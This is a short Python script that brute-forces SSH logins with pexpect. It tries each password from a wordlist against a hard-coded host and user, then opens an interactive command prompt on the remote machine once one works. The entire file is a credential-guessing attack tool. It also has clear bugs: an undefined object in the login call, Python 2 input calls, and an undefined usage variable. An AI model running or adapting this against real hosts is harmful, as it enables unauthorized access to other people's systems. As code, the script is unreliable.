#!/usr/bin/env python3
from pexpect import pxssh
import sys
import time

def connect(host, user, password):
    try:
        s.pxssh.pxssh()
        s.login(host,user,password)
        print("Password found" + password)
        return s
    except Exception as e:
        print(Exception)

def main():
    host="192.168.29.150"
    user="jeff"
    dictionary="/home/jeff/Desktop/sample.txt"

    if host and user and dictionary:
        with open(dictionary) as infile:
            for line in infile:
                password =line.strip('\r\n')
                print("testing: " + str(password))
                con = connect(host, user, password)
                if con:
                    print("SSH connected")
                    command = raw_input(">")
                    while command != "q" and command != "Q":
                        con.sendline(command)
                        con.prompt()
                        print(con.before)
                        command = raw_input(">")
    else:
        print(usage)
        exit(0)
main()